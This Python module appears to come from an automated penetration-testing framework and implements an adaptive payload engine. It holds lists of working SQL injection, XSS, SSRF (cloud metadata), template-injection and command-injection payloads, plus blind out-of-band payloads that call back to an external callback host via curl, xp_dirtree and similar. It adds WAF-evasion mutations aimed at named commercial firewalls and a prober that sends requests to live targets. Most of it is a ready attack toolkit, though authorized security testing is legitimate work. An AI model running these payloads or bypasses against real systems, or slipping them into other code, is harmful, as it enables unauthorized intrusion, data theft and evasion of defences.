"""
Adaptive Payload Intelligence Engine
Context-aware payload generation, mutation, and evolutionary optimization.
"""

import base64
import hashlib
import json
import random
import urllib.parse
from typing import Any, Callable, Dict, List, Optional

import httpx

from ai_osop.adapters.payload_mcp import PayloadMCPAdapter
from ai_osop.core.enums import VulnClass
from ai_osop.core.models import Payload


class PayloadTemplateLibrary:
    """Curated payload templates organized by vulnerability class and context."""

    TEMPLATES: Dict[VulnClass, Dict[str, List[str]]] = {
        VulnClass.SQLI: {
            "error_based": [
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
                "' UNION SELECT NULL, NULL, NULL--",
                "1' OR '1'='1",
                "1' AND 1=1--",
                "1' AND 1=2--",
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL, NULL--",
                "' UNION SELECT NULL, NULL, NULL--",
                "' UNION ALL SELECT username, password FROM users--",
            ],
            "time_based": [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND pg_sleep(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
            "boolean_based": [
                "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
                "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>50--",
            ],
        },
        VulnClass.XSS: {
            "html_body": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
            ],
            "html_attribute": [
                '" onmouseover="alert(1)',
                "' onfocus='alert(1) autofocus",
                '" onerror="alert(1)',
            ],
            "javascript_context": [
                "';alert(1);//",
                "-alert(1)-",
                "';alert(1);'",
            ],
            "template_engine": [
                "{{7*7}}",
                "{{constructor.constructor('alert(1)')()}}",
                "<%= 7*7 %>",
            ],
        },
        VulnClass.SSRF: {
            "metadata_service": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data",
                "http://metadata.google.internal/computeMetadata/v1/",
            ],
            "internal_services": [
                "http://localhost:80",
                "http://127.0.0.1:8080",
                "http://0.0.0.0:22",
            ],
            "ip_obfuscation": [
                "http://0177.0.0.1/",
                "http://2130706433/",
                "http://0x7f000001/",
                "http://[::1]/",
            ],
        },
        VulnClass.SSTI: {
            "detection": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
            ],
            "jinja2": [
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ],
            "twig": [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            ],
        },
        VulnClass.IDOR: {
            "sequential": [
                "1",
                "2",
                "3",
                "4",
                "5",
            ],
            "predictable": [
                "user_1",
                "user_2",
                "admin",
            ],
        },
        VulnClass.JWT_ABUSE: {
            "alg_none": [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",
            ],
            "alg_confusion": [
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
            ],
        },
        VulnClass.RCE: {
            "command_injection": [
                "; id",
                "| id",
                "$(id)",
                "`id`",
            ],
            "deserialization": [
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhw",
            ],
        },
    }

    @classmethod
    def get_templates(cls, vuln_type: VulnClass, context: Optional[str] = None) -> List[str]:
        """Get templates for vulnerability class and optional context."""
        templates = cls.TEMPLATES.get(vuln_type, {})

        if context and context in templates:
            return templates[context]

        # Return all templates for vuln type
        all_templates = []
        for ctx_templates in templates.values():
            all_templates.extend(ctx_templates)
        return all_templates

    # ---- Blind-class stubs (Part III) ---------------------------------------
    #
    # Blind classes (blind_xss / blind_sqli / blind_ssti) deliberately have no
    # VulnClass enum member: they are dispatch-time categories, not findings.
    # Each stub embeds a literal {{OAST_CALLBACK_URL}} placeholder that the
    # CALLER resolves at dispatch from the minted namespaced token URL (see
    # ExploitValidationAgent._mint_namespaced_token / _confirm_blind_by_token).

    BLIND_TEMPLATES: Dict[str, Dict[str, List[str]]] = {
        "blind_xss": {
            "script_src": [
                '<script src="{{OAST_CALLBACK_URL}}"></script>',
            ],
            "img_beacon": [
                '<img src="{{OAST_CALLBACK_URL}}">',
            ],
        },
        "blind_sqli": {
            "mssql_oob_dns": [
                "'; EXEC xp_dirtree '\\\\{{OAST_CALLBACK_URL}}\\a'--",
            ],
            "mysql_oob_dns": [
                "' UNION SELECT load_file('//{{OAST_CALLBACK_URL}}/x')--",
            ],
            "postgres_oob_http": [
                "'; SELECT * FROM dblink('host={{OAST_CALLBACK_URL}}','select 1')--",
            ],
            "oracle_oob_http": [
                "' AND utl_http.request('http://{{OAST_CALLBACK_URL}}/x')=1--",
            ],
        },
        "blind_ssti": {
            "jinja2_oob_fetch": [
                "{{ self.__init__.__globals__.__builtins__.__import__('urllib.request').request.urlopen('{{OAST_CALLBACK_URL}}') }}",
            ],
            "twig_oob_fetch": [
                "{{ _self.env.registerFilter('exec').exec('curl {{OAST_CALLBACK_URL}}') }}",
            ],
        },
    }

    def templates_for(self, vuln_class: str) -> Dict[str, List[str]]:
        """Return the blind-class template families for ``vuln_class``.

        ``vuln_class`` is the dispatch-time class string (e.g. "blind_xss");
        unknown classes yield an empty dict. The returned mapping nests payload
        lists under a per-technique key so callers can pick a family by the
        detected stack (mssql_oob_dns, jinja2_oob_fetch, ...) or flatten.
        """
        return self.BLIND_TEMPLATES.get(vuln_class, {})

    @classmethod
    def get_context_aware_templates(
        cls,
        vuln_type: VulnClass,
        *,
        dbms: Optional[str] = None,
        waf: Optional[str] = None,
        framework: Optional[str] = None,
        context: Optional[str] = None,
    ) -> List[str]:
        """Get payloads adapted to the target's DBMS, WAF, and framework.

        Context-aware payload generation (Priority 8 of the roadmap): a human
        researcher doesn't send MySQL payloads against PostgreSQL, or
        un-obfuscated payloads against Cloudflare. This method selects +
        mutates payloads based on what we know about the target.

        Args:
            dbms: detected database ('mysql', 'postgresql', 'mssql', 'sqlite', 'oracle')
            waf: detected WAF ('cloudflare', 'aws_waf', 'akamai', 'f5_bigip', 'sucuri', 'imperva')
            framework: detected framework ('django', 'flask', 'spring', 'express', 'rails', 'aspnet')
            context: injection context ('error_based', 'union_based', 'time_based', 'html_body', etc.)

        Returns:
            List of payloads adapted to the target's technology stack.
        """
        base = cls.get_templates(vuln_type, context)
        if not base:
            return []

        adapted: List[str] = []

        for payload in base:
            p = payload

            # DBMS-specific adaptation for SQLi
            if vuln_type == VulnClass.SQLI:
                if dbms == "postgresql":
                    # Replace MySQL-specific syntax with PostgreSQL equivalents
                    p = p.replace("SLEEP(5)", "pg_sleep(5)")
                    p = p.replace("WAITFOR DELAY '0:0:5'--", "pg_sleep(5)--")
                    p = p.replace("@@version", "version()")
                    p = p.replace("CONVERT(int,", "::text")
                elif dbms == "mssql":
                    p = p.replace("pg_sleep(5)", "WAITFOR DELAY '0:0:5'--")
                    p = p.replace("SLEEP(5)", "WAITFOR DELAY '0:0:5'--")
                elif dbms == "sqlite":
                    p = p.replace("SLEEP(5)", "randomblob(100000000)")
                    p = p.replace("pg_sleep(5)", "randomblob(100000000)")
                    p = p.replace("WAITFOR DELAY '0:0:5'--", "randomblob(100000000)")
                elif dbms == "oracle":
                    p = p.replace("SLEEP(5)", "DBMS_LOCK.SLEEP(5)")
                    p = p.replace("@@version", "banner FROM v$version")

            # WAF bypass: apply encoding mutations for known WAFs
            if waf == "cloudflare":
                # Cloudflare blocks common SQLi patterns; use mixed-case + comments
                if vuln_type == VulnClass.SQLI:
                    p = p.replace("UNION", "UnIoN")
                    p = p.replace("SELECT", "SeLeCt")
                    p = p.replace("' OR", "' /*!OR*/")
                # XSS: use SVG + data URIs instead of <script>
                elif vuln_type == VulnClass.XSS:
                    if "<script>" in p:
                        p = p.replace("<script>alert(1)</script>", "<svg/onload=alert(1)>")
            elif waf == "aws_waf":
                # AWS WAF: try case variation + inline comments
                if vuln_type == VulnClass.SQLI:
                    p = p.replace("OR", "oR")
                    p = p.replace("AND", "aNd")
            elif waf == "akamai":
                # Akamai: use HTML entity encoding for XSS
                if vuln_type == VulnClass.XSS:
                    p = "".join(f"&#{ord(c)};" if c in "<>\"'" else c for c in p)

            # Framework-specific adaptation
            if framework == "django":
                # Django's template engine uses {% %} and {{ }}
                if vuln_type == VulnClass.SSTI:
                    p = "{% debug %}"
            elif framework == "flask":
                if vuln_type == VulnClass.SSTI:
                    p = "{{ config.SECRET_KEY }}"
            elif framework == "spring":
                # Spring: SpEL injection
                if vuln_type == VulnClass.SSTI:
                    p = "#{T(java.lang.Runtime).getRuntime().exec('id')}"

            adapted.append(p)

        return adapted


class EncodingPipeline:
    """Multi-stage encoding pipeline for payload obfuscation."""

    @staticmethod
    def apply(payload: str, encoding_chain: List[str]) -> str:
        """Apply encoding chain to payload."""
        result = payload
        for encoding in encoding_chain:
            result = EncodingPipeline._encode(result, encoding)
        return result

    @staticmethod
    def _encode(data: str, encoding: str) -> str:
        encoders = {
            "url": lambda x: urllib.parse.quote(x, safe=""),
            "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x, safe=""), safe=""),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "html_entity": lambda x: "".join(f"&#{ord(c)};" for c in x),
            "unicode": lambda x: "".join(f"\\u{ord(c):04x}" for c in x),
            "hex": lambda x: "".join(f"%{ord(c):02x}" for c in x),
            "null_byte": lambda x: x + "%00",
        }
        encoder = encoders.get(encoding, lambda x: x)
        return encoder(data)


class WAFBypassStrategies:
    """WAF evasion techniques mapped to observed blocking patterns."""

    STRATEGIES: Dict[str, List[Callable]] = {
        "keyword_filter": [
            lambda p: p.replace("UNION", "UnIoN").replace("SELECT", "SeLeCt"),
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "%0a"),
        ],
        "comment_filter": [
            lambda p: p.replace(" ", "/*!50000 " + " " * random.randint(1, 5) + " */"),
        ],
        "length_filter": [
            lambda p: p[:100] if len(p) > 100 else p,
        ],
    }

    @classmethod
    def apply_strategy(cls, payload: str, waf_profile: str) -> str:
        """Apply bypass strategy based on WAF profile."""
        strategies = cls.STRATEGIES.get(waf_profile, [])
        if strategies:
            return random.choice(strategies)(payload)
        return payload


class PayloadFitnessEvaluator:
    """Evaluate payload effectiveness based on target response."""

    @staticmethod
    def evaluate(payload: Payload, response: Dict[str, Any], waf_detected: bool = False) -> float:
        """
        Calculate fitness score [0.0, 1.0].

        Components:
        - success_indicator (40%): Did it exploit successfully?
        - response_quality (20%): Information richness
        - stealth_score (20%): WAF evasion
        - efficiency_score (10%): Payload compactness
        - novelty_bonus (10%): New bypass technique
        """
        success = PayloadFitnessEvaluator._success_indicator(response, waf_detected)
        quality = PayloadFitnessEvaluator._response_quality(response)
        stealth = 1.0 if not waf_detected else 0.3
        efficiency = PayloadFitnessEvaluator._efficiency_score(payload)
        novelty = 0.1 if payload.strategy == "genetic" else 0.0

        fitness = success * 0.4 + quality * 0.2 + stealth * 0.2 + efficiency * 0.1 + novelty * 0.1

        return min(fitness, 1.0)

    @staticmethod
    def _success_indicator(response: Dict[str, Any], waf_detected: bool) -> float:
        if waf_detected:
            return 0.0

        status = response.get("status", "unknown")
        if status == "success":
            return 1.0
        elif status == "partial":
            return 0.5
        elif "error" in str(response).lower():
            return 0.3  # Error might indicate vulnerability
        return 0.0

    @staticmethod
    def _response_quality(response: Dict[str, Any]) -> float:
        """Score based on information leakage in response."""
        score = 0.0

        if "error_message" in response:
            score += 0.3
        if "extracted_data" in response:
            score += 0.5
        if "timing_diff" in response:
            score += 0.2

        return min(score, 1.0)

    @staticmethod
    def _efficiency_score(payload: Payload) -> float:
        """Score based on payload compactness."""
        length = len(payload.content)
        if length < 50:
            return 1.0
        elif length < 200:
            return 0.7
        elif length < 500:
            return 0.4
        return 0.1


class WAFCharacterProber:
    """Probes individual characters against a target parameter/URL to detect filtering or WAF blocks."""

    def __init__(self, client: Optional[httpx.AsyncClient] = None):
        self.client = client

    async def probe_characters(
        self,
        url: str,
        param_name: str,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        characters: Optional[List[str]] = None,
    ) -> Dict[str, str]:
        """Probe each character and return a map of character -> status."""
        if characters is None:
            characters = [
                "'",
                '"',
                "<",
                ">",
                "/",
                ";",
                "(",
                ")",
                "[",
                "]",
                "{",
                "}",
                "--",
                "#",
                "`",
                "$",
            ]

        char_map = {}
        # W5: audited insecure-TLS opt-in (probe target may present bad certs);
        # logged and coercible via OSOP_TLS_VERIFY instead of silent verify=False.
        from ai_osop.safety.governed_client import resolve_tls_verify

        client = self.client or httpx.AsyncClient(
            verify=resolve_tls_verify(False, allow_insecure=True, tool="payload_engine")
        )
        close_client = self.client is None

        try:
            # Establish baseline request (benign value)
            baseline_val = "baseline123"
            try:
                if method.upper() == "GET":
                    baseline_resp = await client.request(
                        method, url, params={param_name: baseline_val}, headers=headers, timeout=5.0
                    )
                else:
                    baseline_resp = await client.request(
                        method, url, data={param_name: baseline_val}, headers=headers, timeout=5.0
                    )
                baseline_status = baseline_resp.status_code
            except Exception:
                return {c: "allowed" for c in characters}

            # Probe each character
            for char in characters:
                try:
                    payload_val = f"test{char}value"
                    if method.upper() == "GET":
                        resp = await client.request(
                            method,
                            url,
                            params={param_name: payload_val},
                            headers=headers,
                            timeout=5.0,
                        )
                    else:
                        resp = await client.request(
                            method,
                            url,
                            data={param_name: payload_val},
                            headers=headers,
                            timeout=5.0,
                        )

                    if resp.status_code in (403, 406, 418, 429) or (
                        resp.status_code != baseline_status and resp.status_code >= 400
                    ):
                        char_map[char] = "blocked"
                    elif char not in resp.text and char in payload_val:
                        char_map[char] = "filtered"
                    else:
                        char_map[char] = "allowed"
                except Exception:
                    char_map[char] = "blocked"

        finally:
            if close_client:
                await client.aclose()

        return char_map


class AdaptivePayloadEngine:
    """
    Core payload intelligence engine.

    Implements:
    - Template-based generation
    - LLM-enhanced context adaptation
    - Genetic algorithm evolution
    - WAF profile learning
    """

    def __init__(
        self,
        mcp_adapter: Optional[PayloadMCPAdapter] = None,
        llm_client: Optional[Any] = None,
        client: Optional[Any] = None,
    ):
        self.mcp = mcp_adapter
        self.llm_client = llm_client
        self.template_library = PayloadTemplateLibrary()
        self.encoding_pipeline = EncodingPipeline()
        self.waf_strategies = WAFBypassStrategies()
        self.fitness_evaluator = PayloadFitnessEvaluator()
        self.prober = WAFCharacterProber(client)

        self._waf_profiles: Dict[str, Dict[str, Any]] = {}
        self._population_history: Dict[str, List[Payload]] = {}
        self._character_maps: Dict[str, Dict[str, str]] = {}

    async def probe_target_characters(
        self,
        target_hash: str,
        url: str,
        param_name: str,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
    ) -> Dict[str, str]:
        """Probe characters for a target and cache the results."""
        char_map = await self.prober.probe_characters(url, param_name, method, headers)
        self._character_maps[target_hash] = char_map
        return char_map

    def get_payloads(self, vuln_type: VulnClass) -> List[str]:
        """Get list of payload strings for the specified vulnerability class."""
        return self.template_library.get_templates(vuln_type)

    async def generate_initial_population(
        self, vuln_type: VulnClass, context: Dict[str, Any], population_size: int = 20
    ) -> List[Payload]:
        """Generate diverse initial payload population."""
        population = []

        # 1. Template-based payloads (60%)
        templates = self.template_library.get_templates(vuln_type)
        for template in templates[: int(population_size * 0.6)]:
            payload = Payload(
                vuln_type=vuln_type,
                content=template,
                content_hash=hashlib.sha256(template.encode()).hexdigest()[:16],
                context=context,
                strategy="template",
                engagement_id=context.get("engagement_id", ""),
            )
            population.append(payload)

        # 2. Encoded variants (20%)
        if templates:
            for encoding in [["url"], ["base64"], ["html_entity"]]:
                encoded = self.encoding_pipeline.apply(templates[0], encoding)
                payload = Payload(
                    vuln_type=vuln_type,
                    content=encoded,
                    content_hash=hashlib.sha256(encoded.encode()).hexdigest()[:16],
                    encoding_chain=encoding,
                    context=context,
                    strategy="encoding",
                    engagement_id=context.get("engagement_id", ""),
                )
                population.append(payload)

        # 3. LLM-enhanced payloads (20%)
        if len(population) < population_size:
            llm_payloads = await self._llm_generate(
                vuln_type, context, population_size - len(population)
            )
            population.extend(llm_payloads)

        return population[:population_size]

    async def evolve_population(
        self,
        population: List[Payload],
        vuln_type: VulnClass,
        context: Dict[str, Any],
        generations: int = 10,
    ) -> List[Payload]:
        """
        Evolve payload population using genetic algorithm.

        Algorithm:
        1. Evaluate fitness of each payload
        2. Select top performers
        3. Crossover to create offspring
        4. Apply mutations
        5. Replace low-fitness individuals
        """
        for gen in range(generations):
            # Evaluate fitness (requires MCP execution)
            for payload in population:
                if payload.fitness_score == 0.0:
                    # Execute and evaluate
                    result = await self.mcp.analyze_response(
                        payload, {"status": "pending"}, None  # Would be actual response
                    )
                    payload.fitness_score = self.fitness_evaluator.evaluate(payload, result, False)

            # Sort by fitness
            population.sort(key=lambda p: p.fitness_score, reverse=True)

            # Selection: keep top 30%
            survivors = population[: max(1, len(population) // 3)]

            # Crossover and mutation to fill rest
            offspring = []
            while len(survivors) + len(offspring) < len(population):
                parent1, parent2 = random.sample(survivors, 2)
                child = await self._crossover(parent1, parent2, gen)
                child = await self._mutate(child, vuln_type, context)
                offspring.append(child)

            population = survivors + offspring

            # Check for convergence
            if all(p.fitness_score > 0.8 for p in population[:5]):
                break

        return population

    async def _llm_generate(
        self, vuln_type: VulnClass, context: Dict[str, Any], count: int
    ) -> List[Payload]:
        """Generate payloads using LLM for novel contexts."""
        if not self.llm_client or count <= 0:
            return []

        messages = [
            {
                "role": "system",
                "content": (
                    "Generate non-destructive security validation payload candidates. "
                    "Return strict JSON with a top-level 'payloads' array of strings. "
                    "Do not include commands that modify state, persistence, or exfiltration."
                ),
            },
            {
                "role": "user",
                "content": json.dumps(
                    {
                        "vulnerability_class": vuln_type.value,
                        "target_context": context,
                        "count": count,
                    },
                    sort_keys=True,
                ),
            },
        ]
        raw_response = await self.llm_client.complete(messages)
        candidates = self._parse_llm_payloads(raw_response, count)

        payloads: List[Payload] = []
        for candidate in candidates:
            payloads.append(
                Payload(
                    vuln_type=vuln_type,
                    content=candidate,
                    content_hash=hashlib.sha256(candidate.encode()).hexdigest()[:16],
                    context=context,
                    strategy="llm",
                    engagement_id=context.get("engagement_id", ""),
                )
            )
        return payloads

    def _parse_llm_payloads(self, raw_response: Any, count: int) -> List[str]:
        """Parse and validate LLM payload JSON output."""
        parsed = None
        if isinstance(raw_response, dict):
            content = raw_response.get("content")
            if isinstance(content, str):
                try:
                    parsed = json.loads(content)
                except json.JSONDecodeError:
                    parsed = raw_response
            else:
                parsed = raw_response
        elif isinstance(raw_response, str):
            try:
                parsed = json.loads(raw_response)
            except json.JSONDecodeError:
                return []
        else:
            return []

        if not isinstance(parsed, dict):
            return []

        values = parsed.get("payloads", [])
        if not isinstance(values, list):
            return []

        payloads = []
        for value in values:
            if isinstance(value, str) and value.strip():
                payloads.append(value.strip()[:1000])
            if len(payloads) >= count:
                break
        return payloads

    async def _crossover(self, parent1: Payload, parent2: Payload, generation: int) -> Payload:
        """Combine features from two parent payloads."""
        # Simple crossover: take encoding from one, structure from other
        content = parent1.content
        encoding = parent2.encoding_chain

        if encoding:
            content = self.encoding_pipeline.apply(content, encoding)

        return Payload(
            vuln_type=parent1.vuln_type,
            content=content,
            content_hash=hashlib.sha256(content.encode()).hexdigest()[:16],
            encoding_chain=encoding,
            context=parent1.context,
            generation=generation,
            parent_id=parent1.id,
            strategy="genetic",
            engagement_id=parent1.engagement_id,
        )

    async def _mutate(
        self, payload: Payload, vuln_type: VulnClass, context: Dict[str, Any]
    ) -> Payload:
        """Apply random mutation to payload, respecting target character controls."""
        target_hash = context.get("target_hash") or context.get("target") or ""
        char_map = self._character_maps.get(target_hash, {})

        # Heuristic mutation based on character map
        mutations = []

        # 1. Base mutations
        mutations.append(lambda p: p.replace(" ", random.choice(["/**/", "%0a", "%09"])))

        if vuln_type == VulnClass.SQLI:
            mutations.append(lambda p: p.replace("SELECT", "SeLeCt") if "SELECT" in p else p)

        # Add comment termination if allowed
        comment_char = "#" if char_map.get("#") == "allowed" else "--"
        mutations.append(lambda p: p + random.choice([comment_char, ";%00"]))

        # If quotes are blocked, we must apply encoding variations (WAF character probe integration)
        blocked_chars = [c for c, status in char_map.items() if status == "blocked"]

        # Generate mutated content
        chosen_mutator = random.choice(mutations)
        mutated_content = chosen_mutator(payload.content)

        encoding_chain = list(payload.encoding_chain or [])
        # If any of the characters in the mutated content are blocked, force an encoding variation
        if any(c in mutated_content for c in blocked_chars):
            # Apply an encoding that bypasses character filtering
            best_encoding = random.choice(["url", "hex", "unicode"])
            if best_encoding not in encoding_chain:
                encoding_chain.append(best_encoding)
                mutated_content = self.encoding_pipeline.apply(mutated_content, [best_encoding])
        else:
            # Standard encoding variation
            if random.random() < 0.3:
                extra_mutations = [
                    lambda p: self.encoding_pipeline.apply(
                        p, [random.choice(["url", "hex", "null_byte"])]
                    )
                ]
                mutated_content = random.choice(extra_mutations)(mutated_content)

        return Payload(
            vuln_type=payload.vuln_type,
            content=mutated_content,
            content_hash=hashlib.sha256(mutated_content.encode()).hexdigest()[:16],
            encoding_chain=encoding_chain,
            context=payload.context,
            generation=payload.generation + 1,
            parent_id=payload.id,
            strategy="genetic",
            engagement_id=payload.engagement_id,
        )

    async def learn_waf_profile(
        self, target_hash: str, blocked_payloads: List[Payload], allowed_payloads: List[Payload]
    ) -> Dict[str, Any]:
        """
        Learn WAF signature from observed blocking behavior.

        Analyzes differences between blocked and allowed payloads
        to infer WAF rules.
        """
        profile = {
            "target_hash": target_hash,
            "blocked_patterns": [],
            "allowed_patterns": [],
            "suggested_strategies": [],
            "confidence": 0.0,
        }

        # Extract common patterns from blocked payloads
        for payload in blocked_payloads:
            profile["blocked_patterns"].append(
                {
                    "content": payload.content[:50],
                    "encoding": payload.encoding_chain,
                    "vuln_type": payload.vuln_type.value,
                }
            )

        # Extract common patterns from allowed payloads
        for payload in allowed_payloads:
            profile["allowed_patterns"].append(
                {
                    "content": payload.content[:50],
                    "encoding": payload.encoding_chain,
                    "vuln_type": payload.vuln_type.value,
                }
            )

        # Infer bypass strategies
        if blocked_payloads:
            # If plain payloads blocked, suggest encoding
            if any(not p.encoding_chain for p in blocked_payloads):
                profile["suggested_strategies"].append("encoding_variation")

            # If keywords blocked, suggest case randomization
            if any("UNION" in p.content or "SELECT" in p.content for p in blocked_payloads):
                profile["suggested_strategies"].append("case_randomization")

            profile["confidence"] = min(len(blocked_payloads) / 10, 1.0)

        self._waf_profiles[target_hash] = profile
        return profile
